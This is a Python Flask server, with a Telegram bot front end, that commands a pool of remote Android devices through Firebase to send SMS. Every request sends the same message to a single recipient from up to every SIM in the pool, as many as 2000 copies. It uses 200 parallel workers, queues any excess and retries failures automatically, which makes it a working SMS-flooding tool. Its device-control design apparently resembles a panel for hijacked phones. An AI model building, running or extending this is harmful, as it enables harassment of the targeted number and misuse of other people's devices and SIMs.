#!/usr/bin/env python3
"""
Message Gateway — Flask API + shared dispatch core.

Website aur Telegram bot dono EXACTLY isi file ke helpers chalate hain,
isliye dono kabhi diverge nahi ho sakte.

  Website :  python3 app.py            ->  http://127.0.0.1:5000
  Bot     :  python3 gateway_bot.py    ->  dono ek saath bhi chal sakte hain

NOTE: the bot talks to this file over HTTP (not by importing it), so both
processes share ONE delivery tracker instead of two private copies.

v2 — REAL delivery accounting:
  · har worker apna actual Firebase HTTP result record karta hai
    (200 -> sent, exception -> failed), so the count is MEASURED,
    never the `total` we guessed at submit time.
  · per-device breakdown, so you can see WHICH gateway is failing.
  · one automatic retry per message on transient Firebase errors.
  · jobs are persisted to delivery.json, so a browser refresh mid-blast
    keeps showing the real numbers instead of resetting to zero.
  · GET /api/delivery returns the live snapshot — poll it for the true count.
  · 1 SIM = 1 MESSAGE (no parts, no splitting). capacity = devices × 2.
  · POST /api/message takes {to, message, count}. Maange 50 aur pool me
    50 SIM ho → 50 jayenge. Maange 55 aur pool me 50 SIM ho → 50 jayenge
    aur bache 5 QUEUE me jayenge; blast + cooldown khatam hone par wo
    AUTOMATICALLY chala jayenge.

Endpoints:
  GET  /api/status        -> {configured}
  POST /api/firebase      -> {url, key}
  GET  /api/devices       -> {ok, devices:[...]}
  GET  /api/delivery      -> {ok, job:{...}, jobs:[...], queue:[...]}  (real progress)
  GET  /api/delivery/failures -> {ok, count, failures:[...]}
  POST /api/message       -> {to, message, count} -> {ok, requested, capacity, queued, job_id}
  POST /api/message-retry -> {only: deviceIdPrefix} -> {ok, retried, job_id}

NOTE: device deletion is intentionally NOT exposed over the API any more —
nobody can remove a gateway from the website or the bot by accident.
"""
import json
import os
import re
import threading
import time
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, urlencode
from urllib.request import Request, urlopen

import requests
from requests.adapters import HTTPAdapter

from flask import Flask, jsonify, request, send_from_directory

BASE = os.path.dirname(os.path.abspath(__file__))
CONFIG_FILE = os.path.join(BASE, 'firebase.json')
DELIVERY_FILE = os.path.join(BASE, 'delivery.json')
QUEUE_FILE = os.path.join(BASE, 'queue.json')
app = Flask(__name__, static_folder=BASE, static_url_path='')

SIMS_PER_DEVICE = 2      # har device me 2 SIM cards (SIM 1, SIM 2)

# ═══════════════════════════════════════════════════════════════
#  MODEL:  1 SIM = 1 MESSAGE.  No parts, no splitting.
#    capacity = devices × 2  (poora pool — online + offline)
#    Aap 50 maange aur pool me 50 SIM ho → 50 jayenge.
#    Aap 55 maange aur pool me sirf 50 SIM ho → 50 jayenge aur bache
#    5 QUEUE me chale jayenge; current blast + cooldown khatam hone par
#    wo AUTOMATICALLY chala jayenge.
# ═══════════════════════════════════════════════════════════════
AUTO_COOLDOWN = 30       # ek batch khatam hone ke baad, next batch me gap
MAX_COUNT = 2000         # ek request me max kitne messages
GATEWAY_PORT = int(os.environ.get('GATEWAY_PORT', '5000'))

# Parallel workers. Zyada = tez blast, but Firebase ke against bhi load hota hai.
WORKERS = int(os.environ.get('GATEWAY_WORKERS', '200'))
EXECUTOR = ThreadPoolExecutor(max_workers=WORKERS)
HTTP_LOCAL = threading.local()

JOBS_KEPT = 8            # last N blasts yaad rehti hain
STALE_AFTER = 900        # 15 min ke baad ek "running" job stale maani jati hai


def log(msg=''):
    print(msg, flush=True)


def clamp_count(v, default=1):
    """Kitne messages bhejne hain — 1..MAX_COUNT. Kuch bhi aaye safe."""
    try:
        n = int(float(str(v).strip()))
    except (TypeError, ValueError):
        return default
    return max(1, min(MAX_COUNT, n))


# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════
def load_config():
    if not os.path.exists(CONFIG_FILE):
        return None
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return data if data.get('url') and data.get('key') else None
    except Exception:
        return None


def save_config(url, key):
    data = {'url': normalize_url(url), 'key': key.strip()}
    _atomic_write(CONFIG_FILE, json.dumps(data, indent=2))


def is_configured():
    return bool(load_config())


def _atomic_write(path, text):
    tmp = path + '.tmp'
    with open(tmp, 'w', encoding='utf-8') as f:
        f.write(text)
    os.replace(tmp, path)


def normalize_url(url):
    url = str(url or '').strip()
    if not url:
        raise ValueError('Firebase URL is required')
    if not re.match(r'^https?://', url, re.I):
        url = 'https://' + url
    url = url.rstrip('/')
    if url.endswith('.json'):
        url = url[:-5].rstrip('/')
    return url


# ═══════════════════════════════════════════════════════════════
#  FIREBASE
# ═══════════════════════════════════════════════════════════════
def firebase_url(base, path=''):
    base = normalize_url(base)
    path = str(path or '').strip('/')
    encoded = '/'.join(quote(part, safe='') for part in path.split('/')) if path else ''
    return base + ('/' + encoded if encoded else '') + '.json'


def _http_session():
    session = getattr(HTTP_LOCAL, 'session', None)
    if session is None:
        session = requests.Session()
        adapter = HTTPAdapter(pool_connections=32, pool_maxsize=64, max_retries=0)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.headers.update({'Connection': 'keep-alive'})
        HTTP_LOCAL.session = session
    return session

def firebase_request(method, base, key, path='', body=None, timeout=6):
    target = firebase_url(base, path)
    target += ('&' if '?' in target else '?') + urlencode({'auth': key})
    session = _http_session()
    resp = session.request(method, target, json=body if body is not None else None, timeout=timeout)
    resp.raise_for_status()
    return resp.status_code


def require_config():
    cfg = load_config()
    if not cfg:
        raise RuntimeError('Firebase is not configured.')
    return cfg


def connect_firebase(url, key):
    """Credentials Firebase se validate karke save. Failure pe raise."""
    if not key or not url:
        raise ValueError('Both Database URL and secret are required')
    url = normalize_url(url)
    firebase_request('GET', url, key.strip(), 'clients')
    save_config(url, key.strip())
    return url


def fetch_clients(cfg):
    """Raw `clients` dict straight from Firebase using a pooled keep-alive connection."""
    target = firebase_url(cfg['url'], 'clients') + '?' + urlencode({'auth': cfg['key']})
    resp = _http_session().get(target, timeout=8)
    resp.raise_for_status()
    return resp.json()


# ═══════════════════════════════════════════════════════════════
#  DEVICES
# ═══════════════════════════════════════════════════════════════
def device_list(raw):
    if not isinstance(raw, dict):
        return []
    result = []
    for device_id, value in raw.items():
        if not isinstance(value, dict):
            value = {'value': value}
        sims = value.get('sims') if isinstance(value.get('sims'), list) else []
        phone = value.get('phoneNumber') or (sims[0].get('phoneNumber') if sims and isinstance(sims[0], dict) else '—')
        result.append({
            'id': str(device_id),
            'name': str(value.get('name') or value.get('deviceName') or value.get('model') or device_id),
            'phoneNumber': phone or '—',
            'status': bool(value.get('status')),
            'model': value.get('model') or '—',
            'batteryPercent': value.get('batteryPercent')
        })
    return result


def get_devices(cfg=None):
    """Returns (devices, error). Never raises — safe for both callers."""
    cfg = cfg or load_config()
    if not cfg:
        return [], 'Firebase is not configured.'
    try:
        return device_list(fetch_clients(cfg)), None
    except Exception as e:
        return [], str(e)


# ═══════════════════════════════════════════════════════════════
#  DELIVERY TRACKER  (v2 — measured, per-device, persistent)
# ═══════════════════════════════════════════════════════════════
class DeliveryTracker:
    """
    Har blast ek 'job' hai. Job ke andar har device ka apna counter hai.

    submitted -> task queue me daal diya gaya (total ke barabar hota hai)
    sent     -> Firebase ne HTTP 200 diya   (REAL delivery)
    failed   -> exception, retry ke baad bhi nahi hua

    `sent` hamesha measured hai — ye `total` ka estimate nahi hai.
    """

    def __init__(self):
        self._lock = threading.RLock()
        self._jobs = OrderedDict()
        self._seq = 0
        self._dirty = 0.0
        self._load()

    # ---------- persistence ----------
    def _load(self):
        if not os.path.exists(DELIVERY_FILE):
            return
        try:
            with open(DELIVERY_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
        except Exception:
            return
        jobs = data.get('jobs') or []
        for job in jobs[-JOBS_KEPT:]:
            submitted = int(job.get('submitted', 0) or 0)
            done = int(job.get('sent', 0) or 0) + int(job.get('failed', 0) or 0)
            requested = int(job.get('requested', job.get('total', 0)) or 0)
            dispatched = int(job.get('dispatched', 0) or 0)
            queued = max(0, requested - dispatched)
            job['interrupted'] = bool((submitted > done) or queued > 0)
            self._jobs[job['id']] = job
        self._seq = data.get('seq', 0)

    def _persist(self, force=False):
        # 1344 completions pe har ek file write nahi — throttle + final flush
        now = time.time()
        if not force and now - self._dirty < 0.5:
            return
        self._dirty = now
        try:
            _atomic_write(DELIVERY_FILE, json.dumps(
                {'seq': self._seq, 'jobs': list(self._jobs.values())[-JOBS_KEPT:]},
                ensure_ascii=False,
            ))
        except Exception:
            pass

    # ---------- job lifecycle ----------
    def start(self, to, message, devices, requested, capacity, dispatched):
        """Ek user request = ek job. `requested` poora maanga, `dispatched` abhi bheja."""
        with self._lock:
            self._seq += 1
            job_id = time.strftime('%H%M%S') + '-' + format(self._seq, '02d')
            job = {
                'id': job_id,
                'to': to,
                'message': message,
                'requested': int(requested),
                'capacity': int(capacity),
                'dispatched': int(dispatched),
                'total': int(requested),      # target — bar pura bharna hai
                'submitted': 0,
                'sent': 0,
                'failed': 0,
                'started': time.time(),
                'finished': 0.0,
                'interrupted': False,
                'workers': WORKERS,
                'failures': [],          # [device_id, sim] pairs
                'devices': {
                    d['id']: {
                        'name': d['name'],
                        'status': d['status'],
                        'phoneNumber': d['phoneNumber'],
                        'batteryPercent': d['batteryPercent'],
                        'total': 0, 'sent': 0, 'failed': 0,
                    }
                    for d in devices
                },
            }
            self._jobs[job_id] = job
            while len(self._jobs) > JOBS_KEPT:
                self._jobs.popitem(last=False)
            self._persist(force=True)
            return job_id

    def dispatch(self, job_id, n):
        """Queue se n aur messages ab bhej rahe hain."""
        with self._lock:
            job = self._jobs.get(job_id)
            if not job:
                return
            job['dispatched'] += n
            job['finished'] = 0.0
            self._persist(force=True)

    def submit(self, job_id, device_id):
        with self._lock:
            job = self._jobs.get(job_id)
            if not job:
                return
            job['submitted'] += 1
            job['finished'] = 0.0        # naya batch shuru — timer dobara
            dev = job['devices'].get(device_id)
            if dev:
                dev['total'] += 1
            self._persist()

    def finish(self, job_id, device_id, ok):
        with self._lock:
            job = self._jobs.get(job_id)
            if not job:
                return
            if ok:
                job['sent'] += 1
            else:
                job['failed'] += 1
            dev = job['devices'].get(device_id)
            if dev:
                dev['sent' if ok else 'failed'] += 1
            done = job['sent'] + job['failed']
            if job['submitted'] and done >= job['submitted'] and not job['finished']:
                job['finished'] = time.time()
            self._persist()

    def record_failure(self, job_id, device_id, sim):
        """Kaun sa exact (device, SIM) fail hua — retry ke liye yaad rakhna."""
        with self._lock:
            job = self._jobs.get(job_id)
            if not job:
                return
            fails = job.setdefault('failures', [])
            if len(fails) < 6000:      # runaway se bachao
                fails.append([device_id, sim])
            self._persist()

    def failures(self, job_id=None):
        """Failed (device_id, sim) pairs."""
        with self._lock:
            if job_id and job_id in self._jobs:
                raw = self._jobs[job_id].get('failures') or []
            elif not self._jobs:
                return []
            else:
                raw = self._jobs[list(self._jobs)[-1]].get('failures') or []
            return [tuple(f[:2]) for f in raw]

    def raw(self, job_id=None):
        """Raw job dict (to / message ke liye) — copy return hota hai."""
        with self._lock:
            if job_id and job_id in self._jobs:
                return dict(self._jobs[job_id])
            if not self._jobs:
                return None
            return dict(self._jobs[list(self._jobs)[-1]])

    # ---------- reads ----------
    def _view(self, job):
        done = job['sent'] + job['failed']
        requested = job.get('requested') or job.get('total') or 1
        capacity = job.get('capacity') or 0
        dispatched = job.get('dispatched', 0)
        elapsed = (job['finished'] or time.time()) - job['started']

        in_flight = max(0, job['submitted'] - done)
        queued = max(0, requested - dispatched)          # abhi bheja hi nahi
        pending = queued + in_flight                      # total baaki

        # "running" = sirf tab jab kuch IN-FLIGHT hai. Agar sab dispatch ho
        # chuka aur bacha queue me hai to running=False — warna auto-queue
        # apne aap block ho jayega.
        complete = bool(job['submitted']) and in_flight == 0 and queued == 0
        running = in_flight > 0 and (time.time() - job['started']) < STALE_AFTER

        # Bar poore REQUEST ke against bharta hai — 55 maange the to 50/55 dikhega.
        processed = min(100.0, done * 100.0 / requested)
        devices = []
        for dev_id, dev in job['devices'].items():
            d_done = dev['sent'] + dev['failed']
            devices.append({
                'id': dev_id,
                'name': dev['name'],
                'status': dev['status'],
                'phoneNumber': dev['phoneNumber'],
                'batteryPercent': dev['batteryPercent'],
                'total': dev['total'],
                'sent': dev['sent'],
                'failed': dev['failed'],
                'done': d_done >= dev['total'] and dev['total'] > 0,
            })
        devices.sort(key=lambda d: (d['failed'] > 0, d['name'].lower()))
        return {
            'id': job['id'],
            'to': job['to'],
            'message': job['message'],
            'requested': requested,
            'capacity': capacity,
            'dispatched': dispatched,
            'queued': queued,
            'total': requested,
            'submitted': job['submitted'],
            'sent': job['sent'],
            'failed': job['failed'],
            'failed_tasks': len(job.get('failures') or []),
            'done': done,
            'remaining': pending,
            # percent = bar (poore maange ke against kitna gaya).
            'percent': round(processed, 1),
            'sent_percent': round(min(100.0, job['sent'] * 100.0 / requested), 1),
            'success': round(job['sent'] * 100.0 / done, 1) if done else None,
            'complete': complete,
            'running': running,
            'interrupted': bool(job.get('interrupted')),
            'started': job['started'],
            'elapsed': round(elapsed, 1),
            'rate': round(done / elapsed, 1) if elapsed > 0.4 and done else 0.0,
            'active': sum(1 for d in devices if d['status']),
            'devices': devices,
        }

    def snapshot(self, job_id=None):
        with self._lock:
            if job_id and job_id in self._jobs:
                return self._view(self._jobs[job_id])
            if not self._jobs:
                return None
            last = list(self._jobs)[-1]
            return self._view(self._jobs[last])

    def job_ids(self):
        with self._lock:
            return list(self._jobs)[-JOBS_KEPT:]

    def reset(self):
        """Saari history saaf — diagnostics ke liye."""
        with self._lock:
            self._jobs.clear()
            self._persist(force=True)

    def active(self):
        """Currently chal raha hai ya nahi."""
        with self._lock:
            for job_id in reversed(list(self._jobs)):
                view = self._view(self._jobs[job_id])
                if view['running']:
                    return job_id
        return None

    def wait(self, job_id=None, timeout=180, every=0.4):
        """Blocking wait for a blast to finish. Bot ise use karta hai."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            view = self.snapshot(job_id)
            if not view:
                return None
            if view['complete'] or view['interrupted']:
                return view
            time.sleep(every)
        return self.snapshot(job_id)


TRACKER = DeliveryTracker()
STATS = TRACKER          # purana naam turant migrate karne ke liye


# ═══════════════════════════════════════════════════════════════
#  BROADCAST
# ═══════════════════════════════════════════════════════════════
def _send_once(cfg, device_id, sim, count, to, message):
    path = f'clients/{device_id}/webhookEvent/sendSms'
    body = {
        'from': sim,
        'to': to,
        'message': message,
        'isSended': False,
        'timestamp': int(time.time() * 1000)
    }
    return firebase_request('PUT', cfg['url'], cfg['key'], path, body)


def build_slots(devices):
    """Har device ke 2 SIM = 2 slots. Online devices PEHLE (zyada success)."""
    slots = []
    for d in sorted(devices, key=lambda x: (not x['status'], x['name'].lower())):
        for sim in range(1, SIMS_PER_DEVICE + 1):
            slots.append({'device_id': d['id'], 'sim': sim,
                          'name': d['name'], 'status': d['status']})
    return slots


def send_single_task(cfg, device_id, sim, to, message, job_id=None):
    """1 SIM = 1 message, pura text. Ek automatic retry."""
    label = f'Dev: {device_id[:6]}.. | SIM {sim}'
    last = None
    for attempt in (1, 2):
        try:
            status = _send_once(cfg, device_id, sim, 1, to, message)
            TRACKER.finish(job_id, device_id, True)
            log(f'[⚡ INSTANT] {label} -> HTTP {status}')
            return True
        except Exception as e:
            last = e
            if attempt == 1:
                continue                 # immediate retry; no artificial delay
    TRACKER.record_failure(job_id, device_id, sim)
    TRACKER.finish(job_id, device_id, False)
    log(f'[FAILED] {label} -> {last}')
    return False


def blast(cfg, to, message, count, online_only=False, job_id=None):
    """
    1 SIM = 1 message, pura text (koi parts/splitting nahi).

      count = 55, pool me 25 devices (50 SIM) → 50 abhi jayenge,
                                              5 QUEUE me jayenge aur
                                              current blast + cooldown ke
                                              baad AUTOMATIC chal jayenge.
      count = 50, pool me 50 SIM              → 50 abhi, kuch queue nahi.
    """
    count = clamp_count(count)
    devices = device_list(fetch_clients(cfg))
    if not devices:
        raise RuntimeError('No devices found in the pool')
    if online_only:
        devices = [d for d in devices if d['status']]

    slots = build_slots(devices)
    capacity = len(slots)
    if capacity == 0:
        raise RuntimeError('No SIM cards available')

    new_job = job_id is None
    if new_job:
        job_id = TRACKER.start(to, message, devices, count, capacity,
                               min(count, capacity))

    batch = min(count, capacity)
    for s in slots[:batch]:
        TRACKER.submit(job_id, s['device_id'])
        EXECUTOR.submit(send_single_task, cfg, s['device_id'], s['sim'],
                        to, message, job_id)

    queued = max(0, count - batch)
    active = sum(1 for d in devices if d['status'])
    log(f'[BLAST] job={job_id} to={to} asked={count} sims={capacity} '
        f'devices={len(devices)} (active {active}) sent_now={batch} queued={queued}')

    return {'ok': True, 'job_id': job_id, 'requested': count,
            'capacity': capacity, 'dispatched': batch, 'queued': queued,
            'devices_count': len(devices), 'active_devices': active,
            'total': count}


def broadcast(cfg, to, message, count, online_only=False):
    """User request + auto-queue. Ye hai public entry point."""
    count = clamp_count(count)
    res = blast(cfg, to, message, count, online_only)
    if res['queued'] > 0:
        enqueue({'to': to, 'message': message, 'remaining': res['queued'],
                 'job_id': res['job_id'], 'ready_at': time.time() + AUTO_COOLDOWN})
    return res


# ═══════════════════════════════════════════════════════════════
#  AUTO-QUEUE — capacity se zyada maanga to bacha hua apne aap chalta hai
# ═══════════════════════════════════════════════════════════════
QUEUE = []
QUEUE_LOCK = threading.Lock()
QUEUE_LOADED = False


def _persist_queue_unlocked():
    """Persist queue state while QUEUE_LOCK is held."""
    try:
        _atomic_write(QUEUE_FILE, json.dumps(QUEUE, ensure_ascii=False, indent=2))
    except Exception as e:
        log(f'!! queue persist: {e}')


def _load_queue():
    """Load pending queue once after TRACKER has restored delivery jobs."""
    global QUEUE_LOADED
    with QUEUE_LOCK:
        if QUEUE_LOADED:
            return
        QUEUE_LOADED = True
        if not os.path.exists(QUEUE_FILE):
            return
        raw = None
        try:
            with open(QUEUE_FILE, 'r', encoding='utf-8') as f:
                raw = json.load(f)
        except Exception:
            raw = []
        if not isinstance(raw, list):
            raw = []
        for item in raw:
            if not isinstance(item, dict):
                continue
            try:
                remaining = int(float(str(item.get('remaining', 0)).strip()))
            except (TypeError, ValueError):
                continue
            remaining = max(0, min(MAX_COUNT, remaining))
            if remaining <= 0:
                continue
            to = str(item.get('to', '')).strip()
            message = str(item.get('message', ''))
            if not to or not message:
                continue
            QUEUE.append({
                'to': to,
                'message': message,
                'remaining': remaining,
                'job_id': item.get('job_id'),
                'ready_at': float(item.get('ready_at', time.time() + AUTO_COOLDOWN)),
            })
        log(f'[QUEUE] restored {len(QUEUE)} pending item(s)') if QUEUE else None


def enqueue(item):
    with QUEUE_LOCK:
        item = dict(item)
        item['remaining'] = clamp_count(item.get('remaining'), default=0)
        if item['remaining'] <= 0:
            return
        QUEUE.append(item)
        _persist_queue_unlocked()
    log(f'[QUEUE] +{item["remaining"]} queued (total queue {queue_size()}) · '
        f'next in {max(0, round(item.get("ready_at", time.time()) - time.time()))}s')


def queue_size():
    with QUEUE_LOCK:
        return len(QUEUE)


def queue_view():
    with QUEUE_LOCK:
        return [{'to': q['to'], 'remaining': q['remaining'],
                 'job_id': q.get('job_id'),
                 'in_seconds': max(0, round(q['ready_at'] - time.time()))}
                for q in QUEUE]


def _pump_queue():
    _load_queue()
    with QUEUE_LOCK:
        if not QUEUE:
            return
        if TRACKER.active():
            return
        head = QUEUE[0]
        if time.time() < head['ready_at']:
            return
        n = int(head.get('remaining', 0))
        if n <= 0:
            QUEUE.pop(0)
            _persist_queue_unlocked()
            return
        # Reserve this batch while holding the lock; if dispatch fails, it is
        # restored below rather than silently lost.
        head['remaining'] = 0
        _persist_queue_unlocked()

    cfg = load_config()
    if not cfg:
        log('[QUEUE] Firebase config missing — queue ruk gaya')
        with QUEUE_LOCK:
            head['remaining'] = n
            head['ready_at'] = time.time() + 30
            _persist_queue_unlocked()
        return

    try:
        res = blast(cfg, head['to'], head['message'], n,
                    job_id=head.get('job_id'))
    except Exception as e:
        log(f'[QUEUE] blast failed: {e}')
        with QUEUE_LOCK:
            head['remaining'] = n
            head['ready_at'] = time.time() + 30
            _persist_queue_unlocked()
        return

    TRACKER.dispatch(head['job_id'], res['dispatched'])
    left = res['queued']
    with QUEUE_LOCK:
        if left > 0:
            head['remaining'] = left
            head['ready_at'] = time.time() + AUTO_COOLDOWN
        else:
            if QUEUE and QUEUE[0] is head:
                QUEUE.pop(0)
        _persist_queue_unlocked()
    log(f'[QUEUE] auto-sent {res["dispatched"]} more · left {left}')


def queue_worker():
    """Daemon thread — restore once, then check queue every 3s."""
    _load_queue()
    while True:
        time.sleep(3)
        try:
            if queue_size():
                _pump_queue()
        except Exception as e:
            log(f'!! queue worker: {e}')


def broadcast_failed(cfg, job_id=None, only=None):
    """
    Sirf FAIL hue messages dobara bhejo — baaki 1332 dobara mat bhejo.
    Returns {ok, retried, devices_count, job_id}.
    """
    fails = TRACKER.failures(job_id)
    if not fails:
        raise RuntimeError('Nothing to retry — is blast me koi failure nahi.')

    if only:
        wanted = {t.strip() for t in re.split(r'[,\s]+', str(only)) if t.strip()}
        # exact id ya koi bhi prefix ('ff99', 'ff99ee00dd' dono chalega)
        fails = [f for f in fails if any(f[0].startswith(t) for t in wanted)]
        if not fails:
            raise RuntimeError('Us device ka koi failed message nahi.')

    src = TRACKER.raw(job_id) or {}
    to, message = src.get('to') or '', src.get('message') or ''
    if not to or not message:
        raise RuntimeError('Original blast ka recipient/message nahi mila.')

    by_id = {d['id']: d for d in device_list(fetch_clients(cfg))}
    todo = [f for f in fails if f[0] in by_id]
    if not todo:
        raise RuntimeError('Ye devices ab pool me nahi hain.')

    involved, seen = [], set()
    for dev_id, _sim in todo:
        if dev_id not in seen:
            seen.add(dev_id)
            involved.append(by_id[dev_id])

    new_job = TRACKER.start(to, message, involved, len(todo), len(todo), len(todo))
    for dev_id, sim in todo:
        TRACKER.submit(new_job, dev_id)
        EXECUTOR.submit(send_single_task, cfg, dev_id, sim, to, message, new_job)

    log(f'[RETRY] job={new_job} retried={len(todo)} devices={len(involved)}')
    return {'ok': True, 'retried': len(todo), 'devices_count': len(involved), 'job_id': new_job}


# ═══════════════════════════════════════════════════════════════
#  FLASK ROUTES
# ═══════════════════════════════════════════════════════════════
@app.get('/')
def index():
    return send_from_directory(BASE, 'index.html')


@app.get('/api/status')
def api_status():
    return jsonify({'configured': is_configured(), 'workers': WORKERS})


@app.post('/api/firebase')
def api_firebase():
    data = request.get_json(silent=True) or {}
    try:
        connect_firebase(data.get('url', ''), data.get('key', ''))
        return jsonify({'ok': True})
    except ValueError as e:
        return jsonify({'ok': False, 'error': str(e)}), 400
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 502


@app.get('/api/devices')
def api_devices():
    devices, err = get_devices()
    if err:
        return jsonify({'ok': False, 'error': err}), 400
    return jsonify({'ok': True, 'devices': devices})


@app.get('/api/delivery')
def api_delivery():
    """REAL live progress. ?job=<id> se kisi purane blast ko dekho."""
    job = TRACKER.snapshot(request.args.get('job'))
    return jsonify({
        'ok': True,
        'job': job,
        'jobs': TRACKER.job_ids(),
        'active': TRACKER.active(),
        'queue': queue_view(),
        'queue_size': queue_size(),
    })


@app.get('/api/delivery/failures')
def api_delivery_failures():
    """Exactly kaun se (device, SIM) fail hue — retry endpoint isi ko padhta hai."""
    job_id = request.args.get('job')
    fails = TRACKER.failures(job_id)
    limit = min(len(fails), 500)
    return jsonify({
        'ok': True,
        'count': len(fails),
        'devices': sorted({f[0] for f in fails}),
        'failures': [{'device': f[0], 'sim': f[1]} for f in fails[:limit]],
        'truncated': len(fails) > limit,
    })


@app.post('/api/message-retry')
def api_message_retry():
    """Sirf FAIL hue messages dobara bhejo. {only: deviceIdPrefix}"""
    data = request.get_json(silent=True) or {}
    cfg = load_config()
    if not cfg:
        return jsonify({'ok': False, 'error': 'Firebase is not configured.'}), 400
    try:
        return jsonify(broadcast_failed(cfg, None, data.get('only')))
    except RuntimeError as e:
        return jsonify({'ok': False, 'error': str(e)}), 400
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 400


@app.post('/api/message')
def api_message():
    data = request.get_json(silent=True) or {}
    to, message = str(data.get('to', '')).strip(), str(data.get('message', ''))

    if not to or not message.strip():
        return jsonify({'ok': False, 'error': 'Recipient and message required'}), 400

    cfg = load_config()
    if not cfg:
        return jsonify({'ok': False, 'error': 'Firebase is not configured.'}), 400

    try:
        return jsonify(broadcast(cfg, to, message,
                                clamp_count(data.get('count', data.get('copies', 1))),
                                online_only=bool(data.get('onlineOnly'))))
    except RuntimeError as e:
        return jsonify({'ok': False, 'error': str(e)}), 404
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 400


if __name__ == '__main__':
    log(f'⚡ Ultra Engine Running on http://127.0.0.1:{GATEWAY_PORT}  (workers={WORKERS})')
    log(f'   1 SIM = 1 message · {SIMS_PER_DEVICE} SIM/device · '
        f'auto-cooldown {AUTO_COOLDOWN}s')
    log(f'   bind: 0.0.0.0:{GATEWAY_PORT}')
    threading.Thread(target=queue_worker, daemon=True).start()
    app.run(host='0.0.0.0', port=GATEWAY_PORT, debug=False, threaded=True)
